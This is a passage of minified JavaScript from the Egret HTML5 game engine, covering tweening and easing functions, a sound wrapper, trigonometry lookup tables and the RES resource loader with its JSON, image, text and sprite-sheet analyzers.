                    if (this.inRange(f, 55296, 57343))if (this.inRange(f, 56320, 57343))b.push(65533); else if (c === d - 1)b.push(65533); else {
                        var g = a.charCodeAt(c + 1);
                        this.inRange(g, 56320, 57343) ? (f &= 1023, g &= 1023, c += 1, b.push(65536 + (f << 10) + g)) : b.push(65533)
                    } else b.push(f);
                    c += 1
                }
                return b
            };
        a.SIZE_OF_BOOLEAN = 1;
        a.SIZE_OF_INT8 = 1;
        a.SIZE_OF_INT16 = 2;
        a.SIZE_OF_INT32 = 4;
        a.SIZE_OF_UINT8 = 1;
        a.SIZE_OF_UINT16 = 2;
        a.SIZE_OF_UINT32 = 4;
        a.SIZE_OF_FLOAT32 = 4;
        a.SIZE_OF_FLOAT64 = 8;
        return a
    }();
    c.ByteArray = b;
    b.prototype.__class__ = "egret.ByteArray"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a, c, d) {
            b.call(this);
            this._target = null;
            this.loop = this.ignoreGlobalPause = this._useTicks = !1;
            this._actions = this._steps = this.pluginData = null;
            this.paused = !1;
            this.duration = 0;
            this._prevPos = -1;
            this.position = null;
            this._stepPosition = this._prevPosition = 0;
            this.passive = !1;
            this.initialize(a, c, d)
        }

        __extends(a, b);
        a.get = function (b, c, d, h) {
            void 0 === c && (c = null);
            void 0 === d && (d = null);
            void 0 === h && (h = !1);
            h && a.removeTweens(b);
            return new a(b, c, d)
        };
        a.removeTweens = function (b) {
            if (b.tween_count) {
                for (var c =
                    a._tweens, d = c.length - 1; 0 <= d; d--)c[d]._target == b && (c[d].paused = !0, c.splice(d, 1));
                b.tween_count = 0
            }
        };
        a.pauseTweens = function (a) {
            if (a.tween_count)for (var b = c.Tween._tweens, d = b.length - 1; 0 <= d; d--)b[d]._target == a && (b[d].paused = !0)
        };
        a.resumeTweens = function (a) {
            if (a.tween_count)for (var b = c.Tween._tweens, d = b.length - 1; 0 <= d; d--)b[d]._target == a && (b[d].paused = !1)
        };
        a.tick = function (b, c) {
            void 0 === c && (c = !1);
            for (var d = a._tweens.concat(), h = d.length - 1; 0 <= h; h--) {
                var f = d[h];
                c && !f.ignoreGlobalPause || f.paused || f.tick(f._useTicks ?
                    1 : b)
            }
        };
        a._register = function (b, d) {
            var n = b._target, h = a._tweens;
            if (d)n && (n.tween_count = 0 < n.tween_count ? n.tween_count + 1 : 1), h.push(b), a._inited || (c.Ticker.getInstance().register(a.tick, null), a._inited = !0); else for (n && n.tween_count--, n = h.length; n--;)if (h[n] == b) {
                h.splice(n, 1);
                break
            }
        };
        a.removeAllTweens = function () {
            for (var b = a._tweens, c = 0, d = b.length; c < d; c++) {
                var h = b[c];
                h.paused = !0;
                h._target.tweenjs_count = 0
            }
            b.length = 0
        };
        a.prototype.initialize = function (b, c, d) {
            this._target = b;
            c && (this._useTicks = c.useTicks, this.ignoreGlobalPause =
                c.ignoreGlobalPause, this.loop = c.loop, c.onChange && this.addEventListener("change", c.onChange, c.onChangeObj), c.override && a.removeTweens(b));
            this.pluginData = d || {};
            this._curQueueProps = {};
            this._initQueueProps = {};
            this._steps = [];
            this._actions = [];
            c && c.paused ? this.paused = !0 : a._register(this, !0);
            c && null != c.position && this.setPosition(c.position, a.NONE)
        };
        a.prototype.setPosition = function (a, b) {
            void 0 === b && (b = 1);
            0 > a && (a = 0);
            var c = a, d = !1;
            c >= this.duration && (this.loop ? c %= this.duration : (c = this.duration, d = !0));
            if (c == this._prevPos)return d;
            var f = this._prevPos;
            this.position = this._prevPos = c;
            this._prevPosition = a;
            if (this._target)if (d)this._updateTargetProps(null, 1); else if (0 < this._steps.length) {
                for (var g = 0, k = this._steps.length; g < k && !(this._steps[g].t > c); g++);
                g = this._steps[g - 1];
                this._updateTargetProps(g, (this._stepPosition = c - g.t) / g.d)
            }
            0 != b && 0 < this._actions.length && (this._useTicks ? this._runActions(c, c) : 1 == b && c < f ? (f != this.duration && this._runActions(f, this.duration), this._runActions(0, c, !0)) : this._runActions(f, c));
            d && this.setPaused(!0);
            this.dispatchEventWith("change");
            return d
        };
        a.prototype._runActions = function (a, b, c) {
            void 0 === c && (c = !1);
            var d = a, f = b, g = -1, k = this._actions.length, l = 1;
            a > b && (d = b, f = a, g = k, k = l = -1);
            for (; (g += l) != k;) {
                b = this._actions[g];
                var m = b.t;
                (m == f || m > d && m < f || c && m == a) && b.f.apply(b.o, b.p)
            }
        };
        a.prototype._updateTargetProps = function (b, c) {
            var d, h, f, g;
            if (b || 1 != c) {
                if (this.passive = !!b.v)return;
                b.e && (c = b.e(c, 0, 1, 1));
                d = b.p0;
                h = b.p1
            } else this.passive = !1, d = h = this._curQueueProps;
            for (var k in this._initQueueProps) {
                null == (f = d[k]) && (d[k] = f = this._initQueueProps[k]);
                null ==
                (g = h[k]) && (h[k] = g = f);
                f = f == g || 0 == c || 1 == c || "number" != typeof f ? 1 == c ? g : f : f + (g - f) * c;
                var l = !1;
                if (g = a._plugins[k])for (var m = 0, p = g.length; m < p; m++) {
                    var r = g[m].tween(this, k, f, d, h, c, !!b && d == h, !b);
                    r == a.IGNORE ? l = !0 : f = r
                }
                l || (this._target[k] = f)
            }
        };
        a.prototype.setPaused = function (b) {
            this.paused = b;
            a._register(this, !b);
            return this
        };
        a.prototype._cloneProps = function (a) {
            var b = {}, c;
            for (c in a)b[c] = a[c];
            return b
        };
        a.prototype._addStep = function (a) {
            0 < a.d && (this._steps.push(a), a.t = this.duration, this.duration += a.d);
            return this
        };
        a.prototype._appendQueueProps = function (b) {
            var c, d, h, f, g, k;
            for (k in b)if (void 0 === this._initQueueProps[k]) {
                d = this._target[k];
                if (c = a._plugins[k])for (h = 0, f = c.length; h < f; h++)d = c[h].init(this, k, d);
                this._initQueueProps[k] = this._curQueueProps[k] = void 0 === d ? null : d
            }
            for (k in b) {
                d = this._curQueueProps[k];
                if (c = a._plugins[k])for (g = g || {}, h = 0, f = c.length; h < f; h++)c[h].step && c[h].step(this, k, d, b[k], g);
                this._curQueueProps[k] = b[k]
            }
            g && this._appendQueueProps(g);
            return this._curQueueProps
        };
        a.prototype._addAction = function (a) {
            a.t =
                this.duration;
            this._actions.push(a);
            return this
        };
        a.prototype._set = function (a, b) {
            for (var c in a)b[c] = a[c]
        };
        a.prototype.wait = function (a, b) {
            if (null == a || 0 >= a)return this;
            var c = this._cloneProps(this._curQueueProps);
            return this._addStep({d: a, p0: c, p1: c, v: b})
        };
        a.prototype.to = function (a, b, c) {
            void 0 === c && (c = void 0);
            if (isNaN(b) || 0 > b)b = 0;
            return this._addStep({
                d: b || 0,
                p0: this._cloneProps(this._curQueueProps),
                e: c,
                p1: this._cloneProps(this._appendQueueProps(a))
            })
        };
        a.prototype.call = function (a, b, c) {
            void 0 === b && (b = void 0);
            void 0 === c && (c = void 0);
            return this._addAction({f: a, p: c ? c : [], o: b ? b : this._target})
        };
        a.prototype.set = function (a, b) {
            void 0 === b && (b = null);
            return this._addAction({f: this._set, o: this, p: [a, b ? b : this._target]})
        };
        a.prototype.play = function (a) {
            a || (a = this);
            return this.call(a.setPaused, a, [!1])
        };
        a.prototype.pause = function (a) {
            a || (a = this);
            return this.call(a.setPaused, a, [!0])
        };
        a.prototype.tick = function (a) {
            this.paused || this.setPosition(this._prevPosition + a)
        };
        a.NONE = 0;
        a.LOOP = 1;
        a.REVERSE = 2;
        a._tweens = [];
        a.IGNORE = {};
        a._plugins =
        {};
        a._inited = !1;
        return a
    }(c.EventDispatcher);
    c.Tween = d;
    d.prototype.__class__ = "egret.Tween"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
            c.Logger.fatalWithErrorId(1014)
        }

        b.get = function (a) {
            -1 > a && (a = -1);
            1 < a && (a = 1);
            return function (b) {
                return 0 == a ? b : 0 > a ? b * (b * -a + 1 + a) : b * ((2 - b) * a + (1 - a))
            }
        };
        b.getPowIn = function (a) {
            return function (b) {
                return Math.pow(b, a)
            }
        };
        b.getPowOut = function (a) {
            return function (b) {
                return 1 - Math.pow(1 - b, a)
            }
        };
        b.getPowInOut = function (a) {
            return function (b) {
                return 1 > (b *= 2) ? 0.5 * Math.pow(b, a) : 1 - 0.5 * Math.abs(Math.pow(2 - b, a))
            }
        };
        b.sineIn = function (a) {
            return 1 - Math.cos(a * Math.PI / 2)
        };
        b.sineOut = function (a) {
            return Math.sin(a *
            Math.PI / 2)
        };
        b.sineInOut = function (a) {
            return -0.5 * (Math.cos(Math.PI * a) - 1)
        };
        b.getBackIn = function (a) {
            return function (b) {
                return b * b * ((a + 1) * b - a)
            }
        };
        b.getBackOut = function (a) {
            return function (b) {
                return --b * b * ((a + 1) * b + a) + 1
            }
        };
        b.getBackInOut = function (a) {
            a *= 1.525;
            return function (b) {
                return 1 > (b *= 2) ? 0.5 * b * b * ((a + 1) * b - a) : 0.5 * ((b -= 2) * b * ((a + 1) * b + a) + 2)
            }
        };
        b.circIn = function (a) {
            return -(Math.sqrt(1 - a * a) - 1)
        };
        b.circOut = function (a) {
            return Math.sqrt(1 - --a * a)
        };
        b.circInOut = function (a) {
            return 1 > (a *= 2) ? -0.5 * (Math.sqrt(1 - a * a) - 1) : 0.5 *
            (Math.sqrt(1 - (a -= 2) * a) + 1)
        };
        b.bounceIn = function (a) {
            return 1 - b.bounceOut(1 - a)
        };
        b.bounceOut = function (a) {
            return a < 1 / 2.75 ? 7.5625 * a * a : a < 2 / 2.75 ? 7.5625 * (a -= 1.5 / 2.75) * a + 0.75 : a < 2.5 / 2.75 ? 7.5625 * (a -= 2.25 / 2.75) * a + 0.9375 : 7.5625 * (a -= 2.625 / 2.75) * a + 0.984375
        };
        b.bounceInOut = function (a) {
            return 0.5 > a ? 0.5 * b.bounceIn(2 * a) : 0.5 * b.bounceOut(2 * a - 1) + 0.5
        };
        b.getElasticIn = function (a, b) {
            var c = 2 * Math.PI;
            return function (d) {
                if (0 == d || 1 == d)return d;
                var h = b / c * Math.asin(1 / a);
                return -(a * Math.pow(2, 10 * (d -= 1)) * Math.sin((d - h) * c / b))
            }
        };
        b.getElasticOut =
            function (a, b) {
                var c = 2 * Math.PI;
                return function (d) {
                    if (0 == d || 1 == d)return d;
                    var h = b / c * Math.asin(1 / a);
                    return a * Math.pow(2, -10 * d) * Math.sin((d - h) * c / b) + 1
                }
            };
        b.getElasticInOut = function (a, b) {
            var c = 2 * Math.PI;
            return function (d) {
                var h = b / c * Math.asin(1 / a);
                return 1 > (d *= 2) ? -0.5 * a * Math.pow(2, 10 * (d -= 1)) * Math.sin((d - h) * c / b) : a * Math.pow(2, -10 * (d -= 1)) * Math.sin((d - h) * c / b) * 0.5 + 1
            }
        };
        b.quadIn = b.getPowIn(2);
        b.quadOut = b.getPowOut(2);
        b.quadInOut = b.getPowInOut(2);
        b.cubicIn = b.getPowIn(3);
        b.cubicOut = b.getPowOut(3);
        b.cubicInOut = b.getPowInOut(3);
        b.quartIn = b.getPowIn(4);
        b.quartOut = b.getPowOut(4);
        b.quartInOut = b.getPowInOut(4);
        b.quintIn = b.getPowIn(5);
        b.quintOut = b.getPowOut(5);
        b.quintInOut = b.getPowInOut(5);
        b.backIn = b.getBackIn(1.7);
        b.backOut = b.getBackOut(1.7);
        b.backInOut = b.getBackInOut(1.7);
        b.elasticIn = b.getElasticIn(1, 0.3);
        b.elasticOut = b.getElasticOut(1, 0.3);
        b.elasticInOut = b.getElasticInOut(1, 0.3 * 1.5);
        return b
    }();
    c.Ease = d;
    d.prototype.__class__ = "egret.Ease"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
            this.path = "";
            this.audio = null;
            this.type = b.EFFECT
        }

        b.prototype.play = function (a) {
            void 0 === a && (a = !1);
            var b = this.audio;
            b && (isNaN(b.duration) || (b.currentTime = 0), b.loop = a, b.play())
        };
        b.prototype.pause = function () {
            var a = this.audio;
            a && a.pause()
        };
        b.prototype.load = function () {
            var a = this.audio;
            a && a.load()
        };
        b.prototype.addEventListener = function (a, b) {
            this.audio && this.audio.addEventListener(a, b, !1)
        };
        b.prototype.removeEventListener = function (a, b) {
            this.audio && this.audio.removeEventListener(a,
                b, !1)
        };
        b.prototype.setVolume = function (a) {
            var b = this.audio;
            b && (b.volume = a)
        };
        b.prototype.getVolume = function () {
            return this.audio ? this.audio.volume : 0
        };
        b.prototype.preload = function (a) {
            this.type = a
        };
        b.prototype._setAudio = function (a) {
            this.audio = a
        };
        b.MUSIC = "music";
        b.EFFECT = "effect";
        return b
    }();
    c.Sound = d;
    d.prototype.__class__ = "egret.Sound"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.isNumber = function (a) {
            return "number" === typeof a && !isNaN(a)
        };
        b.sin = function (a) {
            a = Math.round(a);
            a %= 360;
            0 > a && (a += 360);
            return 90 > a ? egret_sin_map[a] : 180 > a ? egret_cos_map[a - 90] : 270 > a ? -egret_sin_map[a - 180] : -egret_cos_map[a - 270]
        };
        b.cos = function (a) {
            a = Math.round(a);
            a %= 360;
            0 > a && (a += 360);
            return 90 > a ? egret_cos_map[a] : 180 > a ? -egret_sin_map[a - 90] : 270 > a ? -egret_cos_map[a - 180] : egret_sin_map[a - 270]
        };
        return b
    }();
    c.NumberUtils = d;
    d.prototype.__class__ = "egret.NumberUtils"
})(egret ||
(egret = {}));
for (var egret_sin_map = {}, egret_cos_map = {}, i = 0; 90 >= i; i++)egret_sin_map[i] = Math.sin(i * egret.Matrix.DEG_TO_RAD), egret_cos_map[i] = Math.cos(i * egret.Matrix.DEG_TO_RAD);
Function.prototype.bind || (Function.prototype.bind = function (c) {
    if ("function" !== typeof this)throw new TypeError(egret.getString(1029));
    var d = Array.prototype.slice.call(arguments, 1), b = this, a = function () {
    }, e = function () {
        return b.apply(this instanceof a && c ? this : c, d.concat(Array.prototype.slice.call(arguments)))
    };
    a.prototype = this.prototype;
    e.prototype = new a;
    return e
});
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, RES;
(function (c) {
    var d = function (b) {
        function a(a, c, d) {
            void 0 === c && (c = !1);
            void 0 === d && (d = !1);
            b.call(this, a, c, d);
            this.itemsTotal = this.itemsLoaded = 0;
            this.groupName = "";
            this.resItem = null
        }

        __extends(a, b);
        a.dispatchResourceEvent = function (b, c, d, h, f, g) {
            void 0 === d && (d = "");
            void 0 === h && (h = null);
            void 0 === f && (f = 0);
            void 0 === g && (g = 0);
            var k = egret.Event._getPropertyData(a);
            k.groupName = d;
            k.resItem = h;
            k.itemsLoaded = f;
            k.itemsTotal = g;
            egret.Event._dispatchByTarget(a, b, c, k)
        };
        a.ITEM_LOAD_ERROR = "itemLoadError";
        a.CONFIG_COMPLETE =
            "configComplete";
        a.CONFIG_LOAD_ERROR = "configLoadError";
        a.GROUP_PROGRESS = "groupProgress";
        a.GROUP_COMPLETE = "groupComplete";
        a.GROUP_LOAD_ERROR = "groupLoadError";
        return a
    }(egret.Event);
    c.ResourceEvent = d;
    d.prototype.__class__ = "RES.ResourceEvent"
})(RES || (RES = {}));
(function (c) {
    var d = function () {
        function b(a, b, c) {
            this.groupName = "";
            this.data = null;
            this._loaded = !1;
            this.name = a;
            this.url = b;
            this.type = c
        }

        Object.defineProperty(b.prototype, "loaded", {
            get: function () {
                return this.data ? this.data.loaded : this._loaded
            }, set: function (a) {
                this.data && (this.data.loaded = a);
                this._loaded = a
            }, enumerable: !0, configurable: !0
        });
        b.prototype.toString = function () {
            return '[ResourceItem name="' + this.name + '" url="' + this.url + '" type="' + this.type + '"]'
        };
        b.TYPE_XML = "xml";
        b.TYPE_IMAGE = "image";
        b.TYPE_BIN =
            "bin";
        b.TYPE_TEXT = "text";
        b.TYPE_JSON = "json";
        b.TYPE_SHEET = "sheet";
        b.TYPE_FONT = "font";
        b.TYPE_SOUND = "sound";
        return b
    }();
    c.ResourceItem = d;
    d.prototype.__class__ = "RES.ResourceItem"
})(RES || (RES = {}));
(function (c) {
    var d = function () {
        function b() {
            this.keyMap = {};
            this.groupDic = {};
            c.configInstance = this
        }

        b.prototype.getGroupByName = function (a) {
            var b = [];
            if (!this.groupDic[a])return b;
            a = this.groupDic[a];
            for (var c = a.length, d = 0; d < c; d++)b.push(this.parseResourceItem(a[d]));
            return b
        };
        b.prototype.getRawGroupByName = function (a) {
            return this.groupDic[a] ? this.groupDic[a] : []
        };
        b.prototype.createGroup = function (a, b, c) {
            void 0 === c && (c = !1);
            if (!c && this.groupDic[a] || !b || 0 == b.length)return !1;
            c = this.groupDic;
            for (var d = [], h = b.length,
                     f = 0; f < h; f++) {
                var g = b[f], k = c[g];
                if (k)for (var g = k.length, l = 0; l < g; l++) {
                    var m = k[l];
                    -1 == d.indexOf(m) && d.push(m)
                } else(m = this.keyMap[g]) ? -1 == d.indexOf(m) && d.push(m) : egret.Logger.warningWithErrorId(2E3, g)
            }
            if (0 == d.length)return !1;
            this.groupDic[a] = d;
            return !0
        };
        b.prototype.parseConfig = function (a, b) {
            if (a) {
                var c = a.resources;
                if (c)for (var d = c.length, h = 0; h < d; h++) {
                    var f = c[h], g = f.url;
                    g && -1 == g.indexOf("://") && (f.url = b + g);
                    this.addItemToKeyMap(f)
                }
                if (c = a.groups)for (d = c.length, h = 0; h < d; h++) {
                    for (var g = c[h], k = [], l = g.keys.split(","),
                             m = l.length, p = 0; p < m; p++)f = l[p].trim(), (f = this.keyMap[f]) && -1 == k.indexOf(f) && k.push(f);
                    this.groupDic[g.name] = k
                }
            }
        };
        b.prototype.addSubkey = function (a, b) {
            var c = this.keyMap[b];
            c && !this.keyMap[a] && (this.keyMap[a] = c)
        };
        b.prototype.addItemToKeyMap = function (a) {
            this.keyMap[a.name] || (this.keyMap[a.name] = a);
            if (a.hasOwnProperty("subkeys")) {
                var b = a.subkeys.split(",");
                a.subkeys = b;
                for (var c = b.length, d = 0; d < c; d++) {
                    var h = b[d];
                    null == this.keyMap[h] && (this.keyMap[h] = a)
                }
            }
        };
        b.prototype.getName = function (a) {
            return (a = this.keyMap[a]) ?
                a.name : ""
        };
        b.prototype.getType = function (a) {
            return (a = this.keyMap[a]) ? a.type : ""
        };
        b.prototype.getRawResourceItem = function (a) {
            return this.keyMap[a]
        };
        b.prototype.getResourceItem = function (a) {
            return (a = this.keyMap[a]) ? this.parseResourceItem(a) : null
        };
        b.prototype.parseResourceItem = function (a) {
            var b = new c.ResourceItem(a.name, a.url, a.type);
            b.data = a;
            return b
        };
        return b
    }();
    c.ResourceConfig = d;
    d.prototype.__class__ = "RES.ResourceConfig"
})(RES || (RES = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this.thread = 2;
            this.loadingCount = 0;
            this.resInstance = this.callBack = null;
            this.groupTotalDic = {};
            this.numLoadedDic = {};
            this.itemListDic = {};
            this.groupErrorDic = {};
            this.retryTimesDic = {};
            this.maxRetryTimes = 3;
            this.failedList = [];
            this.priorityQueue = {};
            this.lazyLoadList = [];
            this.analyzerDic = {};
            this.queueIndex = 0
        }

        __extends(a, b);
        a.prototype.isGroupInLoading = function (a) {
            return void 0 !== this.itemListDic[a]
        };
        a.prototype.loadGroup = function (a, b, d) {
            void 0 === d && (d =
                0);
            if (!this.itemListDic[b] && b)if (a && 0 != a.length) {
                this.priorityQueue[d] ? this.priorityQueue[d].push(b) : this.priorityQueue[d] = [b];
                this.itemListDic[b] = a;
                d = a.length;
                for (var h = 0; h < d; h++)a[h].groupName = b;
                this.groupTotalDic[b] = a.length;
                this.numLoadedDic[b] = 0;
                this.next()
            } else egret.Logger.warningWithErrorId(2001, b), a = new c.ResourceEvent(c.ResourceEvent.GROUP_LOAD_ERROR), a.groupName = b, this.dispatchEvent(a)
        };
        a.prototype.loadItem = function (a) {
            this.lazyLoadList.push(a);
            a.groupName = "";
            this.next()
        };
        a.prototype.next =
            function () {
                for (; this.loadingCount < this.thread;) {
                    var a = this.getOneResourceItem();
                    if (!a)break;
                    this.loadingCount++;
                    if (a.loaded)this.onItemComplete(a); else {
                        var b = this.analyzerDic[a.type];
                        b || (b = this.analyzerDic[a.type] = egret.Injector.getInstance(c.AnalyzerBase, a.type));
                        b.loadFile(a, this.onItemComplete, this)
                    }
                }
            };
        a.prototype.getOneResourceItem = function () {
            if (0 < this.failedList.length)return this.failedList.shift();
            var a = Number.NEGATIVE_INFINITY, b;
            for (b in this.priorityQueue)a = Math.max(a, b);
            a = this.priorityQueue[a];
            if (!a || 0 == a.length)return 0 == this.lazyLoadList.length ? null : this.lazyLoadList.pop();
            b = a.length;
            for (var c, d = 0; d < b; d++) {
                this.queueIndex >= b && (this.queueIndex = 0);
                c = this.itemListDic[a[this.queueIndex]];
                if (0 < c.length)break;
                this.queueIndex++
            }
            return 0 == c.length ? null : c.shift()
        };
        a.prototype.onItemComplete = function (a) {
            this.loadingCount--;
            var b = a.groupName;
            if (!a.loaded) {
                var d = this.retryTimesDic[a.name] || 1;
                if (d > this.maxRetryTimes)delete this.retryTimesDic[a.name], c.ResourceEvent.dispatchResourceEvent(this.resInstance,
                    c.ResourceEvent.ITEM_LOAD_ERROR, b, a); else {
                    this.retryTimesDic[a.name] = d + 1;
                    this.failedList.push(a);
                    this.next();
                    return
                }
            }
            if (b) {
                this.numLoadedDic[b]++;
                var d = this.numLoadedDic[b], h = this.groupTotalDic[b];
                a.loaded || (this.groupErrorDic[b] = !0);
                c.ResourceEvent.dispatchResourceEvent(this.resInstance, c.ResourceEvent.GROUP_PROGRESS, b, a, d, h);
                d == h && (a = this.groupErrorDic[b], this.removeGroupName(b), delete this.groupTotalDic[b], delete this.numLoadedDic[b], delete this.itemListDic[b], delete this.groupErrorDic[b], a ? c.ResourceEvent.dispatchResourceEvent(this,
                    c.ResourceEvent.GROUP_LOAD_ERROR, b) : c.ResourceEvent.dispatchResourceEvent(this, c.ResourceEvent.GROUP_COMPLETE, b))
            } else this.callBack.call(this.resInstance, a);
            this.next()
        };
        a.prototype.removeGroupName = function (a) {
            for (var b in this.priorityQueue) {
                for (var c = this.priorityQueue[b], d = c.length, f = 0, g = !1, d = c.length, k = 0; k < d; k++) {
                    if (c[k] == a) {
                        c.splice(f, 1);
                        g = !0;
                        break
                    }
                    f++
                }
                if (g) {
                    0 == c.length && delete this.priorityQueue[b];
                    break
                }
            }
        };
        return a
    }(egret.EventDispatcher);
    c.ResourceLoader = d;
    d.prototype.__class__ = "RES.ResourceLoader"
})(RES ||
(RES = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this.resourceConfig = null;
            this.resourceConfig = c.configInstance
        }

        __extends(a, b);
        a.prototype.addSubkey = function (a, b) {
            this.resourceConfig.addSubkey(a, b)
        };
        a.prototype.loadFile = function (a, b, c) {
        };
        a.prototype.getRes = function (a) {
        };
        a.prototype.destroyRes = function (a) {
            return !1
        };
        a.getStringPrefix = function (a) {
            if (!a)return "";
            var b = a.indexOf(".");
            return -1 != b ? a.substring(0, b) : ""
        };
        a.getStringTail = function (a) {
            if (!a)return "";
            var b = a.indexOf(".");
            return -1 != b ? a.substring(b +
            1) : ""
        };
        return a
    }(egret.HashObject);
    c.AnalyzerBase = d;
    d.prototype.__class__ = "RES.AnalyzerBase"
})(RES || (RES = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this.fileDic = {};
            this.resItemDic = [];
            this._dataFormat = egret.URLLoaderDataFormat.BINARY;
            this.recycler = new egret.Recycler
        }

        __extends(a, b);
        a.prototype.loadFile = function (a, b, c) {
            if (this.fileDic[a.name])b.call(c, a); else {
                var d = this.getLoader();
                this.resItemDic[d.hashCode] = {item: a, func: b, thisObject: c};
                d.load(new egret.URLRequest(a.url))
            }
        };
        a.prototype.getLoader = function () {
            var a = this.recycler.pop();
            a || (a = new egret.URLLoader, a.addEventListener(egret.Event.COMPLETE,
                this.onLoadFinish, this), a.addEventListener(egret.IOErrorEvent.IO_ERROR, this.onLoadFinish, this));
            a.dataFormat = this._dataFormat;
            return a
        };
        a.prototype.onLoadFinish = function (a) {
            var b = a.target, c = this.resItemDic[b.hashCode];
            delete this.resItemDic[b.hashCode];
            this.recycler.push(b);
            var d = c.item, f = c.func;
            d.loaded = a.type == egret.Event.COMPLETE;
            d.loaded && this.analyzeData(d, b.data);
            f.call(c.thisObject, d)
        };
        a.prototype.analyzeData = function (a, b) {
            var c = a.name;
            !this.fileDic[c] && b && (this.fileDic[c] = b)
        };
        a.prototype.getRes =
            function (a) {
                return this.fileDic[a]
            };
        a.prototype.hasRes = function (a) {
            return null != this.getRes(a)
        };
        a.prototype.destroyRes = function (a) {
            return this.fileDic[a] ? (delete this.fileDic[a], !0) : !1
        };
        return a
    }(c.AnalyzerBase);
    c.BinAnalyzer = d;
    d.prototype.__class__ = "RES.BinAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._dataFormat = egret.URLLoaderDataFormat.TEXTURE
        }

        __extends(a, b);
        a.prototype.analyzeData = function (a, b) {
            var c = a.name;
            !this.fileDic[c] && b && (this.fileDic[c] = b, (c = a.data) && c.scale9grid && (c = c.scale9grid.split(","), b.scale9Grid = new egret.Rectangle(parseInt(c[0]), parseInt(c[1]), parseInt(c[2]), parseInt(c[3]))))
        };
        return a
    }(c.BinAnalyzer);
    c.ImageAnalyzer = d;
    d.prototype.__class__ = "RES.ImageAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._dataFormat = egret.URLLoaderDataFormat.TEXT
        }

        __extends(a, b);
        a.prototype.analyzeData = function (a, b) {
            var c = a.name;
            if (!this.fileDic[c] && b)try {
                this.fileDic[c] = JSON.parse(b)
            } catch (d) {
                egret.Logger.warningWithErrorId(1017, a.url, b)
            }
        };
        return a
    }(c.BinAnalyzer);
    c.JsonAnalyzer = d;
    d.prototype.__class__ = "RES.JsonAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._dataFormat = egret.URLLoaderDataFormat.TEXT
        }

        __extends(a, b);
        return a
    }(c.BinAnalyzer);
    c.TextAnalyzer = d;
    d.prototype.__class__ = "RES.TextAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this.sheetMap = {};
            this.textureMap = {};
            this._dataFormat = egret.URLLoaderDataFormat.TEXT
        }

        __extends(a, b);
        a.prototype.getRes = function (a) {
            var b = this.fileDic[a];
            b || (b = this.textureMap[a]);
            !b && (b = c.AnalyzerBase.getStringPrefix(a), b = this.fileDic[b]) && (a = c.AnalyzerBase.getStringTail(a), b = b.getTexture(a));
            return b
        };
        a.prototype.onLoadFinish = function (a) {
            var b = a.target, c = this.resItemDic[b.hashCode];
            delete this.resItemDic[b.hashCode];
            this.recycler.push(b);
            var d =
                c.item, f = c.func;
            d.loaded = a.type == egret.Event.COMPLETE;
            if (d.loaded)if ("string" == typeof b.data) {
                if (d.loaded = !1, a = this.analyzeConfig(d, b.data)) {
                    d.url = a;
                    this._dataFormat = egret.URLLoaderDataFormat.TEXTURE;
                    this.loadFile(d, f, c.thisObject);
                    this._dataFormat = egret.URLLoaderDataFormat.TEXT;
                    return
                }
            } else this.analyzeBitmap(d, b.data);
            d.url = d.data.url;
            f.call(c.thisObject, d)
        };
        a.prototype.analyzeConfig = function (a, b) {
            var c = a.name, d, f = "";
            try {
                d = JSON.parse(b)
            } catch (g) {
                egret.Logger.warningWithErrorId(1017, a.url, b)
            }
            d &&
            (this.sheetMap[c] = d, f = this.getRelativePath(a.url, d.file));
            return f
        };
        a.prototype.analyzeBitmap = function (a, b) {
            var c = a.name;
            if (!this.fileDic[c] && b) {
                var d = this.sheetMap[c];
                delete this.sheetMap[c];
                d = this.parseSpriteSheet(b, d, a.data && a.data.subkeys ? "" : c);
                this.fileDic[c] = d
            }
        };
        a.prototype.getRelativePath = function (a, b) {
            a = a.split("\\").join("/");
            var c = a.lastIndexOf("/");
            return a = -1 != c ? a.substring(0, c + 1) + b : b
        };
        a.prototype.parseSpriteSheet = function (a, b, c) {
            b = b.frames;
            if (!b)return null;
            var d = new egret.SpriteSheet(a),
                f = this.textureMap, g;
            for (g in b) {
                var k = b[g];
